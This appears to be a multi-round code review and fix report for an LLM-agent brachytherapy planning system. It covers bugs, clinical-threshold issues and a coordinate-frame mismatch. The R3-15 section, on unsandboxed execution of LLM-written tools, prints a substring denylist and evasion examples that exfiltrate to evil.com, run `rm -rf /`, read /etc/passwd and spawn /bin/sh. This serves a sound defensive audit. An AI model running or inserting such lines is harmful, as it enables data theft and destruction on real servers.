**R4-36.** `brain/knowledge/rag.py:34` — `hashlib.md5(...)` raises `ValueError` in FIPS-compliant environments. Use `hashlib.md5(usedforsecurity=False)`.

**R4-37.** `clinical_kb/__init__.py:31,103` — `KB_DIR.mkdir(...)` and `_ensure_default_kb()` run on module import. Read-only filesystem crash.

**R4-38.** `safety_validator/__init__.py:284-288` — Strict mode threshold mapping only covers 10 specific values. Any threshold not in the map (e.g., 0.92) is not tightened.

**R4-39.** `safety_validator/__init__.py:340-341` — `oar_data.get("dmax", 0) or oar_data.get("Dmax", 0)` — if dmax is exactly 0, falls through to Dmax. If both are 0, correct value is lost.

**R4-40.** `AgenticSys.py:1623` — `list(self.memory.planning_results.keys())[:10]` assumes `planning_results` is always a dict. Latent — safe today because `clear_all_data()` does `.clear()` not `= None`.

**R4-41.** `AgenticSys.py:41` — Dead import: `SYSTEM_PROMPT_TEMPLATE`, `get_prompt_modules` imported but never used.

**R4-42.** `AgenticSys.py:1036,1051,1266,1535` — `from tool_factory import ToolResult` inside method bodies (4 places). Python caches imports, but violates convention and breaks linting.

**R4-43.** `AgenticSys.py:1476-1498` — `_VALIDATORS`/`_RECOVERY_ACTIONS` defined as class attributes (shared across instances). Not mutated today, but latent if code evolves.

**R4-44.** `agents/base_agent.py:188` — `call_llm` type-annotated as `Optional[Callable]` (sync). If caller passes async callback, `json.loads()`/`strip()` on the returned coroutine crashes.

**R4-45.** `agents/base_agent.py:67-68` — Failed messages remain in `message_history`. `get_stats()["success_rate"]` skews.

**R4-46.** `agents/fact_checker.py:341,345` — Uses hardcoded emoji "📌" in output. On CLI/log without emoji support, renders as garbled.

**R4-47.** `agents/plan_reviewer.py:346` — `_MEDICAL_SYSTEM_PROMPT[:2500]` silently truncates the medical knowledge base beyond 2500 chars.

**R4-48.** `agents/safety_guardian.py:24-25` — `SafetyGuardian` accepts `llm_callback` but never uses it. Dead parameter.

**R4-49.** `agents/plan_reviewer.py:250-254` — OAR constraint matching uses `key in organ_lower or organ_lower in key` substring overlap — "rectum" matches "rectum_sigmoid" (reasonable) but "bowel" matches "small_bowel" (potentially wrong limit).

**R4-50.** `agents/router_agent.py:238-241` — `keyword.lower() in input_lower` — `"plan"` matches "implantation", "explanation", "planetary". For short keywords (<5 chars), use word-boundary regex.

---

### Round 4: Verified false positives (NOT bugs — intentional or canceled)

These were flagged by review agents but on tracing are intentional or don't trigger:

- `planning_pipeline.py:1111-1114` normalized dose with output_range = window_range. Intentional identity normalization; actual scaling happens later in `normalize_dose_array`. Harmless.
- `planning_pipeline.py:1142-1145` iterates `plan_res` as flat list. The pipeline path stores `core.optimal_plan` result as `plan_res`, then iterates `for entry in plan_res`. Each entry is `[traj, seeds, doses]` — works correctly with the flat return. Only the `seed_planning.py` standalone tools have the unpacking bug (R4-1).
- `seed_planning_rl.py:175` checks `len(entry) >= 3`. `seed_planning.py:220` checks `len(entry) >= 2`. These are different tools with different output schemas — intentional.
- `quality/quality_gate.py` `passed=True` design is documented append-only semantics. Not a bug.
- `clinical_kb/__init__.py:394` — `kb.get("dose_constraints", {}) or kb.get("legacy_dose_constraints", {})` — empty dict falls through to legacy. Intentional backward-compat.

---

### Round 4: Existing report findings re-confirmed

- R3-11 (RAS↔LPS coordinate frame in `utilizations.py`): confirmed through full call chain trace and connected to pipeline lines 867-870.
- R3-12/13/14 (hardcoded clinical thresholds): confirmed in `plan_reviewer.py:167-176`, `quality_decider.py`, `clinical_decider.py`. New instances found in `orchestrator.md:20-24` (prompt-side thresholds).
- R3-15 (tool_code_writer arbitrary code execution): unchanged.
- R3-16 (case_executor silent step-dropping): unchanged.

---



### Summary — confirmed real bugs (FIXED)

All fixes below are behaviorally verified with focused unit-style assertions; source files compile cleanly under `py_compile`. The annotation discipline from the previous rounds (false-positive labelling preserved, hardcoded clinical thresholds left untouched pending a config-plumbing refactor) is applied throughout.

| ID | File:Line | Sev | Description of bug | Fix |
|----|-----------|-----|--------------------|-----|
| R3-1 | `memory/skill_learner.py:128-...`  | HIGH | `learn_parameter_preferences` round-tripped `tool_name.key=value` through `rsplit('.', 1)` and produced `param_name = "mode=rl"`. The downstream `preference_store.update_from_learned` stored the key as `f"{tool_name}_{param_name}"` = `"seed_planning_mode=rl"`, but `apply_to_tool_params` looks up `f"{tool_name}_{key}"` = `"seed_planning_mode"` — keys never matched, so every learned parameter preference was silently stored but never applied back to tools. | Split on `=` first to recover `param_name = "mode"` and `value = "rl"` separately. |
| R3-2 | `memory/self_evolution.py:132-...`  | HIGH | `_update_existing_skills` iterated `self.skill_registry.list_skills()`, which returns throwaway summary `dict`s `{"name","category","success_rate","usage_count","last_used"}`. Mutations to those dicts only edited the throwaway copy; the underlying `SkillRegistry.skills` and the on-disk `skills_registry.json` were silently untouched. The entire "update existing skills" feature was a no-op. | Iterate `skill_registry.skills.values()` directly; set `skill.usage_count` and `skill.success_count` so that the `success_rate()` method reflects the matching experiences; call `skill_registry._save_skill(skill)` to persist. |
| R3-3 | `skills/skill_base.py:130-...` | MED | `evolve_from_interactions` appended a freshly-created `Skill` to `new_or_updated` at the `else` branch (line 138) AND unconditionally again at line 142. Every new skill appeared twice in the returned list — minor data hygiene, but the returned list drives UI/JSON output. | Capture `is_new_skill` before logic, append only once per iteration. |
| R3-4 | `memory/layered_memory.py:325-...` & `:341-...` | HIGH | `find_sop` incremented `best_sop.usage_count` on every query, and `update_sop_metrics` divided by `n+1` where `n = sop.usage_count` (already counting this query). Combined effect: EMA off-by-one; first `update_sop_metrics(success=True)` set `success_rate = (0*1 + 1)/2 = 0.5` instead of `1.0`, then `usage_count` was double-incremented per successful use. | Remove the `usage_count += 1` from `find_sop` (only `last_used` is updated there); in `update_sop_metrics` set `n = sop.usage_count` (count BEFORE this use), then `sop.usage_count = n + 1`, then `success_rate = (success_rate * n + new)/ (n+1)`. |
| R3-5 | `plans/brachy_plan_v2.py:182-...` | HIGH | Exception handler assigned `dose_image = sitk.GetArrayFromImage(...).astype(np.float32)` (NumPy array), then continued. Downstream `core.optimal_plan_rf → batch_seed_dose_calculation_dl` calls `dose_image.GetDirection()/GetSpacing()/GetOrigin()` and resolves via `sitk.GetArrayFromImage(dose_image)` — all `AttributeError` on a NumPy array, swallowed by the outer `try/except`, leaving the patient an empty plan with no error message. | Replace the `pass` + numpy fallback with `raise`, matching the non-rf `brachy_plan` path at line 48. Failure surfaces instead of silently corrupting the pipeline. |
| R3-6 | `brain/core/tree_search_planner.py:79-...` | MED | `_node_cache` was a `self` attribute initialized lazily inside `_store_node` and never cleared between `search()` calls. Long-running agents that plan repeatedly accumulated `PlanningNode`s unbounded — memory leak + stale stats bleeding across invocations. | Reset `self._node_cache = {}` at the top of every `search()`. |
| R3-7 | `agent_runtime/chat_workflows.py:480-...` (4 sites) | MED/HIGH | Four sites (`chat_with_trace` completeness, `chat_with_stream` review, `chat_with_stream` direct-completeness, `chat_with_stream` post-enforcer) created a new event loop, ran `loop.run_until_complete(...)`, closed the loop in `finally` — but never restored the prior global event loop. After every chat round, the global event loop was a CLOSED loop, breaking any downstream code that called `asyncio.get_event_loop()`. | Capture `prev_loop = asyncio.get_event_loop_policy().get_event_loop()` before `_loop = new_event_loop()`; in `finally`, restore `set_event_loop(prev_loop)`. |
| R3-8 | `web/routes/planning_routes.py:1903` | LOW | `getattr(agent.memory, "patient_data", {}).get("id", "UNKNOWN")` deref'd `.get` directly. If `patient_data` was explicitly set to `None` (legitimate value — patient cleared but attribute still exists), `.get` raised `AttributeError`, aborting the PDF/HTML report builder. | `(getattr(agent.memory, "patient_data", None) or {}).get("id", "UNKNOWN")` — handles None. |
| R3-9 | `agent_runtime/core.py:457-...` | MED | `AgentMemory.compact()` trimmed `self.conversation` to `keep_last` and rolled the summary into `self.context_summary`, but never notified `self.smart_context`. `SmartContextManager.messages` and the `entities`/`topics` dicts grew unbounded; `get_relevant_context` scored already-summarized messages forever -> long-session memory leak + slow retrieval. | After trimming `conversation` under the lock, prune `self.smart_context.messages` to the same `keep_last` count. |
| R3-10 | `plans/visualizer.py:1-...` | MED | Top-level `import vtk` + `import matplotlib.pyplot` made `plans.utilizations` (the main planning entry) fail to import in any Python environment lacking VTK or matplotlib. The only internal consumer in BrachyBot is `utilizations.draw_radiations`, which itself has NO internal BrachyBot callers (dead visualization path). Hard dep blocked headless deployments. | Wrap both imports in `try/except ImportError`; set `vtk = None`/`plt = None` on failure. VTK-dependent functions still raise at call-time if VTK is absent, but module import succeeds. |

### Summary — confirmed real bugs (ANNOTATED, NOT FIXED — fix is risky/unsure)

For these, the bug is real but the fix requires either clinical-discipline review (cannot change clinical output safely without sign-off) or large-scope refactor (security sandbox, OAR-config plumbing). They are flagged with `# REVIEW:` in source so future reviewers see them in-place.

| ID | File:Line | Sev | Why fix is deferred |
|----|-----------|-----|---------------------|
| R3-11 | `plans/utilizations.py:ras_direction_to_voxel` + `compute_body_shell_and_ref_direction` | HIGH (latent) | `ras_direction_to_voxel` computes `v = (ras_direc @ direction) / spacing` where `direction` is SimpleITK's LPS direction-cosine matrix. Per the function name and the organ-default comments in `tool_factory/seed_plan/planning_pipeline._ORGAN_DEFAULT_REFDIREC` ("pancreas=[0,-1,0] posterior"), the input is RAS — but no RAS→LPS sign flip is applied. Symmetrically, `compute_body_shell_and_ref_direction` math produces a vector in LPS but labels it `ras_direction`. Used together, the two bugs cancel; used independently (e.g. hand-set RAS default), the needle approach direction is mirrored along x/y. Fix would change clinical planning output, requires maintainer verification of canonical input convention. |
| R3-12 | `brain/core/multi_agent_critic.py:211-...` | MED | Hardcoded clinical thresholds in `_fallback_critique`: `D90 < 100%`, `D90 > 150%`, `V100 < 90%`. Project rule requires clinical thresholds from `clinical_kb`/`plan_config`. Fix requires plumbing config into the critic; these only fire when the LLM critique fails, so they're last-resort. Annotated. |
| R3-13 | `brain/deciders/quality_decider.py:138-...` and `:197-...` | MED | Hardcoded scoring bands for V100/V150/V200/D90/homogeneity and hardcoded OAR dose constraints (rectum=2x, bladder=1.5x, urethra=1.2x, bowel=0.8x, kidney=0.2x of PD). Same fix path (config plumbing). Annotated. |
| R3-14 | `brain/deciders/clinical_decider.py:124-...` | MED | Hardcoded default `thresholds = {"v100":0.90,"v150":0.35,"v200":0.15,"d90":1.0}`. Same issue — caller override exists via arg, but fallback is in code. Annotated. |
| R3-15 | `brain/core/tool_code_writer.py:198` | HIGH (security) | `spec.loader.exec_module(module)` runs arbitrary LLM-authored Python in the host process. `_validate_code` only substring-denylists (`eval(`, `__import__`, ...) — trivially evaded. A malicious or hallucinated tool spec executes as the server user. NOT FIXED — requires sandbox architecture (restricted namespace, no `os`/`socket`/`subprocess`) and human approval gate. Annotated. |
| R3-16 | `brain/execution/case_executor.py:248-...` | MED | `"Completed {len(plan)} steps successfully"` uses the requested plan length even when `resolve_execution_order` silently breaks on cyclic/unreachable deps (line 117/118), dropping steps from `result.steps`. User is told all N steps completed even if some never ran. Annotated; fix needs to surface dropped steps as FAILED. |

### Detailed analysis — confirmed real bugs (ANNOTATED, NOT FIXED)

Each entry below traces the bug path through the full call chain and documents why a
confident, safe fix cannot be produced without broader clinical or architectural context.

---

#### R3-11. `plans/utilizations.py` — RAS/LPS coordinate-frame mismatch (paired functions)

**Location:** `ras_direction_to_voxel` (:477) and `compute_body_shell_and_ref_direction` (:450)

**Severity:** HIGH (latent in production — cancel pair unless one path is used independently)

**Claim:** `ras_direction_to_voxel` treats its input as LPS; `compute_body_shell_and_ref_direction` labels its output "RAS" but produces LPS. When used together, the two errors cancel. When either function is used independently with true RAS input, the result is wrong.

**Step-by-step trace of `ras_direction_to_voxel` (`utilizations.py:489`):**
```
def ras_direction_to_voxel(ras_direc, image):
    direction = np.array(image.GetDirection()).reshape(3, 3)
    v = (np.array(ras_direc) @ direction) / spacing
```
- `image.GetDirection()` returns SimpleITK's direction-cosine matrix, which is by convention **LPS** (not RAS).
- For an orthonormal direction matrix `D`, `ras @ D = D.T @ ras.T`. Geometrically, this treats the input vector as expressed in the coordinate frame of `D` — i.e., LPS.
- To convert a true RAS vector into the LPS frame before applying `D`, the convention is:
  `lps = ras * [-1, -1, 1]`  (negate x and y, leave z unchanged).
- The function does **not** apply this flip.

**Step-by-step trace of `compute_body_shell_and_ref_direction` (`utilizations.py:464`):**
```
normal_phys_xyz = normal_phys[::-1]           # from [z,y,x] PCA frame → [x,y,z]
ras_direction = normal_phys_xyz @ direction_matrix.T
```
- `direction_matrix` is SimpleITK's LPS direction matrix (passed in or identity). Multiplying `normal_phys_xyz @ D.T` produces a vector in the same frame as `D`, which is **LPS**.
- But the variable is named `ras_direction` and returned as `ref_direction_ras`, documented as RAS.

**Call-site pairing — why it cancels for auto-detection:**
The auto-detection path (`plans/utilizations.py:compute_body_shell_and_ref_direction` → returns "RAS" label / actually LPS) feeds into `ras_direction_to_voxel` (takes "RAS" label / treats as LPS). Both label as RAS; both use LPS math. Result: the two wrongs make a right for this specific paired path.

**Why the organ-default path breaks:**
The organ-specific defaults in `tool_factory/seed_plan/planning_pipeline._ORGAN_DEFAULT_REFDIREC` are documented as true RAS:
```
# pancreas   : posterior [-Y]   (in RAS: -Y = posterior ✓)
# prostate   : posterior [-Y]
```
These values `[0, -1, 0]` (pancreas, prostate) are then passed through `_convert_ref_direc_to_voxel` (`planning_pipeline.py:188`), which calls `ras_direction_to_voxel(np.array(ref_direc_ras), ct_image)`. Since the input is TRUE RAS but the function treats it as LPS, the x and y components end up sign-inverted. For a needle approach direction, this means "posterior" → "anterior" — the needle would be planned from the wrong side of the body.

**Fix that would change clinical output:**
Insert before line 489:
```python
ras_direc = np.asarray(ras_direc) * np.array([-1.0, -1.0, 1.0])
```
**Why NOT fixed:** The fix changes clinical planning output on every call that uses organ defaults. The "auto-detection" path would need the same correction at the `compute_body_shell_and_ref_direction` return. Without full verification by the domain expert who defined the default directions, this would silently flip needle approach for all existing patients. Deferred to maintainer.

---

#### R3-12. `brain/core/multi_agent_critic.py:211-…` — Hardcoded clinical thresholds in `_fallback_critique`

**Location:** `multi_agent_critic.py`, method `_fallback_critique`, lines ~211–228

**Severity:** MEDIUM (last-resort fallback; LLM critique is the primary path)

**Issue:**
```python
if d90_val < 100:                    # D90 below 100% threshold
if d90_val > 150:                    # D90 above 150% threshold
if v100_val < 90:                    # V100 below 90% threshold
```
These thresholds are used only when the LLM critique fails (timeout, parse error, empty response) — a rare fallback. They serve as a coarse sanity check for completely broken plans, not for routine clinical scoring.

**Why fix requires config plumbing:**
The `_fallback_critique` method has no access to `plan_config`, `clinical_kb`, or any dose-constraint source. To make these configurable:
1. `MultiAgentCritic.__init__` would need an optional `config: dict` or `dose_constraints: dict` parameter.
2. `_fallback_critique` would read `self.dose_constraints.get("d90_min", 100)`, etc.
3. All call sites that construct `MultiAgentCritic` would need to pass the config.

**Why NOT fixed:** The refactor touches construction sites across `brain/integration/enhanced_agent.py` and `agent_runtime/core.py`. For a last-resort fallback that fires only on LLM failure, the churn-to-safety ratio is poor. Annotated for when config-plumbing is refactored.

---

#### R3-13. `brain/deciders/quality_decider.py` — Hardcoded scoring bands + OAR constraints

**Location:**
- `_score_coverage` (~line 138): scoring bands for V100/V150/V200
- `_score_homogeneity` (~line 167): D90/PD ratio check
- `_score_oars` (~line 197): OAR dose constraints hardcoded:
  ```python
  default_constraints = {
      "rectum": 2.0 * pd,
      "bladder": 1.5 * pd,
      "urethra": 1.2 * pd,
      "bowel": 0.8 * pd,
      "kidney": 0.2 * pd,
  }
  ```
  Plus fallback for unknown OAR: `all_constraints.get(oar_name.lower(), 2.0 * pd)`

**Impact:**
- The coverage scoring bands (V100≥0.95→+15, V100≥0.90→+12, V150≤0.35→+5, etc.) are reasonable for prostate brachytherapy but may be inappropriate for liver/lung/pancreas cases. For example, lung tumors have much higher permissiveness for V150 due to lower prescription dose.
- The OAR constraints use fixed multiples of prescribed dose (bladder=1.5×PD, rectum=2×PD) which match TG-43 prostate guidelines but differ from site-specific constraints (e.g., liver SBRT has different bowel/kidney limits).
- The `constraints` parameter already allows caller-side override via `+1` in `_score_oars`, but the fallback dict is still in code.

**Why NOT fixed:** These constraints require clinical knowledge to set per-site. A full fix would:
1. Move OAR constraints into `clinical_kb/` or `plan_config`, keyed by tumor type.
2. Plumb `plan_config` into `QualityDecider.__init__`.
3. Fall back to hardcoded values only when config is absent.
This is a clinical-config refactor of broader scope than a single fix.

---

#### R3-14. `brain/deciders/clinical_decider.py:124-…` — Hardcoded default thresholds

**Location:** `clinical_decider.py`, `decide_from_metrics` method:
```python
if thresholds is None:
    thresholds = {
        "v100": 0.90,
        "v150": 0.35,
        "v200": 0.15,
        "d90": 1.0,
    }
```

**Impact:** These thresholds gate the `_normalize_metric` scoring, which transforms raw metrics into decision weights. A D90 of 1.0 Gy means the fallback assumes the prescription is exactly 1 Gy before normalization — unrealistic for any clinical case where PD ≠ 1 Gy. However, the `thresholds` parameter accepts caller-provided values; this fallback only fires when the caller (e.g. `QualityGate` at `quality_gate.py:189`) does not pass `dose_thresholds`.

**Why NOT fixed:** Same as R3-13 — requires config plumbing into the decider. Annotated.

---

#### R3-15. `brain/core/tool_code_writer.py:193-201` — Arbitrary code execution from LLM-authored tool spec

**Location:** `tool_code_writer.py`, `register_generated_tool` method:
```python
module = importlib.util.module_from_spec(spec)
sys.modules[name] = module
spec.loader.exec_module(module)          # <--- runs LLM-generated Python
```

**Security analysis:**
The `_validate_code` method (lines 245-263) performs substring-based deny-list checks:
```python
_BLOCKED_PATTERNS = {"eval(", "__import__", "exec(", "...", "...", "importlib"}
```
This is trivially bypassed:
- `os.environ["PATH"]` — no blocked pattern, reads system environment variables
- `urllib.request.urlopen("http://evil.com/exfil")` — no blocked pattern, data exfiltration
- `__import__("os").system("rm -rf /")` — blocked (`__import__`), but `import os; os.system(...)` is NOT blocked
- `pathlib.Path("/etc/passwd").read_text()` — not blocked, reads arbitrary files
- `socket.gethostbyname("evil.com")` — not blocked, DNS exfiltration
- `os.execv("/bin/sh", ["/bin/sh"])` — not blocked
- The `importlib` substring blocks the string `"importlib"` itself, not the actual call pattern

Additionally:
- `sys.modules[name] = module` pollutes the global namespace — a generated tool named `"utils"` shadows real `utils`.
- No sandbox: the LLM-authored code runs with the full privileges of the server process.

**Production trigger:** The code is called from `enhanced_agent.py:_trigger_auto_evolution` when the `SkillCrystallizer` generates a new skill spec and calls `ToolCodeWriter.register_generated_tool`. The spec is LLM-authored via `self_evolution.py:_suggest_code_improvements` → the feedback loop: LLM generates a prompt → LLM generates tool code → code runs unvetted.

**Minimum fixes (not applied):**
1. Replace substring checks with AST whitelist — compile to AST, only allow specific call patterns (e.g. `numpy.*`, `sitk.*`).
2. Remove `os`, `subprocess`, `socket`, `pathlib`, `shutil`, `requests`, `urllib` from the exec namespace.
3. Namespace generated modules as `f"_autogen_{name}"` to prevent shadowing.
4. Gate with a human-in-the-loop toggle: `AGENT_CODE_EXECUTION_ENABLED` env var, default False.

**Why NOT fixed:** The full AST whitelist + namespace sandbox is a ~100-line change with correctness risks for legitimate tool code. The current state is documented for a dedicated security hardening pass.

---

#### R3-16. `brain/execution/case_executor.py:248-…` — Steps silently dropped from plan without user visibility

**Location:** `case_executor.py`:
- `resolve_execution_order` method (~line 113-118): drops steps when dependency cycle is detected
- `execute_plan` result summary (~line 248): `f"Completed {len(plan)} steps successfully"`

**Trace:**
```python
def resolve_execution_order(self, steps):       # line 105
    executed = set()
    phases = []
    while len(executed) < len(steps):
        current_phase = []
        for step in steps:
            step_id = int(step["id"])
            if step_id in executed:
                continue
            deps = self._step_input_refs(step, include_zero=False)
            if all(d in executed for d in deps):
                current_phase.append(step)
        if not current_phase:                    # line 117 - BREAK on empty phase
            break                                # line 118 - silent exit
        phases.append(current_phase)
        ...
```
When the LLM generates a cyclic dependency graph (step A depends on B, B depends on A), the while loop produces an empty `current_phase` and breaks. Steps in the cycle are never assigned to any phase, never executed, and never added to `result.steps`. But `result.summary = f"Completed {len(plan)} steps successfully"` uses the ORIGINAL `len(plan)`, so the user sees "Completed 5 steps" when really only 3 ran and 2 were dropped.

**Mild mitigation in practice:** Some dropped steps will cause later steps to receive missing inputs, which triggers `KeyError` or `None` at execution time. The failed step's error message may contain clues, but the summary is still misleading.

**Fix:** Before setting `result.status = SUCCESS`, compute `executed_ids = {s.step_id for s in result.steps}` and detect `dropped = [s for s in plan if int(s["id"]) not in executed_ids]`. For each dropped step, create a FAILED `StepResult` and append to `result.steps`. Update summary: `f"Completed {len(result.steps)-len(dropped)}/{len(plan)} steps ({len(dropped)} dropped due to unresolved dependencies)"`.

**Why NOT fixed:** The fix changes case_executor.py's error-reporting semantics. The execution pipeline in `brain/execution/plan_executor.py` already has a `FAILED` return on first exception (line 85-89), so adding step-level failure surfaced from dropped deps would need to coordinate with the `_hooks["on_failure"]` path. Safe fix requires understanding what downstream consumers (UI, reporting) expect from `result.steps`. Annotated.

---

### Summary — false positives or already-intended (NOT BUGS)

Re-verified findings from the dispatched agents that on closer tracing are intentional or don't actually trigger. Listed here so they aren't re-flagged.

| ID | File:Line | Claim | Why NOT a bug |
|----|-----------|------|---------------|
| R3-17 | `agent_runtime/chat_workflows.py:~905` | Agent claimed `gather()` missing `return_exceptions=True`. Verified: line 906 passes `return_exceptions=True` correctly. Same applies to `_post_loop.run_until_complete(_asyncio_post_enforcer.gather(..., return_exceptions=True))` at line 1286. Both sites correct. |
| R3-18 | `quality/quality_gate.py:130-...` | Agent claimed "pass_rate is always 1.0 misleading". **Design intent**: the inline comment explicitly documents that `passed=True` is append-only semantically and statistics track aggregate counts; not a correctness bug. |
| R3-19 | `plans/reinforcement.py` C1/C3 | Re-confirming previous round: `out_damage = covered / exceed_count` is ADDED to reward, shrinks with OAR overdose — correct. (Already annotated in source.) |
| R3-20 | `web/server.py:131` | Agent claimed "min() of empty timestamps possible". Trace: both `_sessions` and `_session_timestamps` are mutated under the same lock with `pop(key, None)`; they stay in lockstep. The check `len(_sessions) >= _max_sessions` is also guarded. Latent-fragility only. |
| R3-21 | `web/routes/planning_routes.py:80` | Agent claimed "dict mutation race on planning_results clear". GIL atomicity protects the `if key in ...: del ...` per-key pattern. The 4 minor concurrent-tab scenarios are already mitigated by the `agent.memory._lock` used elsewhere; explicit lock acquisition is a cosmetic improvement only. |
| R3-22 | `plans/utilizations.py:600-604` (np.isin mask) | Claimed "fragile / corrupts float voxels". Trace: function always uses `sitkNearestNeighbor` interpolation, so every output voxel is an exact copy of some input voxel; `np.isin` is all-True and the `else` branch never fires. Dead code; does not corrupt output. |
| R3-23 | `plans/utilizations.py:218` (`direction_transform` Frobenius norm) | Claimed "wrong for batched (n,3) input". All current callers (core.py:317, utilizations.py:932/1033/2603/2392) pass single 3-vectors. Documented API but doesn't trigger. |
| R3-24 | `agent_runtime/llm_runtime.py:497,532,1866` | Step-status text matching ("Error/Exception"). Confirmed: production tool outputs DO sometimes contain those substrings as benign nouns; misclassification risk exists. NOT FIXED because the heuristic gates only the `success` flag for safety next-step in stream — the underlying tool result is preserved. Awaiting better `tool_result.success`-based gate plumbing. |
| R3-25 | `plans/core.py:137,348` (`distance_transform_edt` without `sampling=`) | "voxels vs mm". Verified by trace: `distance_map` is consumed by `get_available_position` which compares against `seed_volume_length` (also in voxel units via `seed_info['length']/spacing`). Self-consistent even if unit-ambiguous. Documentation concern only. |

### Detailed fidelity notes

**R3-1 `learn_parameter_preferences` (memory/skill_learner.py:128-…)** written test simulating both bug path and fix produces:
- Before: key stored as `"seed_planning_mode=rl"`, lookup never matches.
- After: key stored as `"seed_planning" → {"mode": {"value": "rl", "confidence": 0.4}}`; lookup matches.

**R3-2 `_update_existing_skills` (memory/self_evolution.py:132-…)** written test simulating 4 matching experiences (3 success + 1 fail) yields:
- Before: throwaway dict mutated (effectively no-op), `_save_skill` never called.
- After: live `Skill.usage_count = 4`, `Skill.success_count = 3`, `_save_skill` called once, `success_rate()` returns `0.75`.

**R3-4 `update_sop_metrics` (memory/layered_memory.py:325-…)** mathematical verification:
- Sequence: `find_sop` (no-op inc) → `update_sop_metrics(success=True)` × 2 → `update_sop_metrics(success=False)`
- After first update: `usage=1`, `rate=1.0` ✓ (was `0.5` before)
- After 2T: `usage=2`, `rate=1.0` ✓
- After 2T+1F: `usage=3`, `rate=0.6667` ✓

**R3-7 event-loop restore** — all 4 sites now follow the same pattern:
```python
_prev_loop = None
try: _prev_loop = asyncio.get_event_loop_policy().get_event_loop()
except Exception: pass
_loop = asyncio.new_event_loop()
asyncio.set_event_loop(_loop)
try:
    _loop.run_until_complete(...)
finally:
    _loop.close()
    try: asyncio.set_event_loop(_prev_loop)
    except Exception: pass
```
Verified by `py_compile` for all 4 sites in `agent_runtime/chat_workflows.py`.

### Other lower-severity findings (documented, not fixed)

The dispatch also surfaced ~30 LOW-severity items that are real but don't justify churn:
- `quality/quality_gate.py:175-178` `_STATIC_CONTEXT` duplicates `default_params.json` defaults.
- `preference_store.py:48-66` `DEFAULT_PREFERENCES` duplicating `default_params.json` defaults.
- Widespread non-atomic JSON writes across most `memory/*.py` persistence helpers — wrap with `os.replace()` is the standard mitigation but would conflict with the existing auto-save hooks.
- `brain/core/router.py:391-394` `allow_fallback=False` with missing `explicit_provider` silently falls through to task-policy chain.
- `brain/providers/{tencent,kimi,groq,glm,qwen,mimo,grok,deepseek}_llm.py` lack a manual retry loop.
- `brain/providers/generic_openai_compat.py:157-259` retries mid-stream re-emit prefix → duplicate content on dropped connection.
- `tool_factory/seed_plan/planning_pipeline.py` `_ORGAN_DEFAULT_REFDIREC` semantics already documented as RAS via comments — pair with R3-11 if fixed.
- `plans/dose_pre/functions.py` (dead) — clone of `utilizations.py:2052-2074` with no `+1e-5` guard.
- `plans/dose_pre/myDoseNet.py:160-167` — 7 unused `UpSample` modules waste GPU memory.

These are logged in the per-module sub-reports (preserved in git history).

---



### Follow-up Verification and Fixes

This section records the verification pass performed after commit `130ecde`.
Each item below was checked against the current code before changing it. Items
that were intentional or already safe are called out so they are not repeatedly
misdiagnosed in later reviews.

### Fixed in this follow-up

| Report item | Disposition | Files changed |
|---|---|---|
| C1 `AgentMemory` import | Confirmed real. Added the missing import used by both LLM execution paths. | `agent_runtime/llm_runtime.py` |
| C2 `DOSE_MODEL_SCALE_GY` import | Confirmed real. Imported the constant into the web server facade for report auto-fill interpretation. | `web/server.py` |
| C3 streaming forced-search indentation | Confirmed real. Forced-search finalization and context injection now run for both success and failure. | `agent_runtime/llm_runtime.py` |
| C4 missing path validation | Confirmed real. Manual segmentation and run-step routes now validate image, label, and CT paths through the centralized allowlist. | `web/routes/planning_routes.py` |
| C5 rate-limit concurrency | Confirmed real. Added a shared lock and atomic cleanup/update behavior for the in-memory limiter. | `web/server_support.py` |
| C9 enhanced clear methods | Confirmed real edge case. Enhanced-memory clear calls now check `callable(...)` before invoking optional component methods. | `agent_runtime/core.py` |
| C10 duplicate report registration | Confirmed real noise. Removed the invalid `tool_factory.output.report_generator` registration path; the real `tool_factory.report_generator` registration remains. | `AgenticSys.py` |
| C11 `loadDefaultParams` TDZ | Confirmed real JavaScript syntax/runtime issue. Hoisted `setVal` to one helper inside the function. | `web/app/static/js/brachybot-ui-api.js` |
| C13/I7 planning completion detection | Confirmed real for stepwise/manual paths. Completion now recognizes `planning_pipeline`, `seed_planning`, `dose_engine`, `dose_evaluation`, and `dose_calc`. | `AgenticSys.py` |
| C15 STL export mismatch | Confirmed real product/API mismatch. `/api/export/stl` now writes actual ASCII `.stl` seed cylinders instead of debug `.npy` arrays. | `web/routes/planning_routes.py` |
| C16/C18/H2 CSS issues | Confirmed real. Added `.step-num`, preserved warning borders, and fixed invalid font-family quoting. | `web/app/static/css/*.css` |
| H7 JSON 413 and 500 handlers | Confirmed real API consistency gap. Added JSON response for oversized uploads and exception logging for unhandled 500s. | `web/server.py` |
| H11/M10 fragile Python repr parsing | Confirmed real. Python-style `tool_use` blocks now use `ast.literal_eval` instead of global quote replacement. | `agent_runtime/chat_workflows.py` |
| H14 int16 overflow risk | Confirmed real edge case. CT volume transfer clips before int16 conversion. | `web/routes/viewer_routes.py` |
| H15 mesh cache eviction | Confirmed real performance issue. Cache order now uses `deque.popleft()`. | `web/server_support.py`, `web/routes/viewer_routes.py` |
| H18 contour label null guard | Confirmed real edge case. Dose contour labels now guard `Number.isFinite(contour.level)`. | `web/app/static/js/brachybot-3d-manual.js` |
| H20 mesh cache key collision | Confirmed real edge case. 3D mask cache keys now include a BLAKE2 digest of the binary mask instead of `id(mask_data)`. | `web/routes/viewer_routes.py` |
| H22 API key `None` crash | Confirmed real. Explicit auth without a configured key now fails closed instead of calling `.encode()` on `None`. | `web/server_support.py` |
| I10 planning data-tree null guards | Confirmed real. Planning group visibility paths now tolerate missing seed/needle/dose arrays. | `web/app/static/js/brachybot-viewer-volume.js` |
| I18 screenshot promise handling | Confirmed real. Direct screenshot capture now awaits `html2canvas` consistently. | `web/app/static/js/brachybot-ui-api.js` |
| M25 API-key comparison | Confirmed real hardening opportunity. Header key comparison now uses direct constant-time comparison and fails closed when auth is misconfigured. | `web/server_support.py` |
| M27 duplicate tooltip key | Confirmed real. Removed the duplicate `toolMeasure` key. | `web/app/static/js/brachybot-viewer-layout.js` |
| M29 report source badge injection | Confirmed real. The reset onclick argument now uses JSON string serialization and attribute-safe escaping. | `web/app/static/js/brachybot-report-shell.js` |
| H9 missing Anthropic dependency | Confirmed real for the configured Anthropic provider. Added `anthropic>=0.34.0`. | `requirements.txt` |
| Additional shell invocation scan | Confirmed real in a benchmark helper. Replaced the background benchmark launch with argv-style `subprocess.Popen(...)` and no shell. | `benchmarks/auto_monitor.py` |

### Verified as intentional, stale, or not a defect in current code

| Report item | Current disposition |
|---|---|
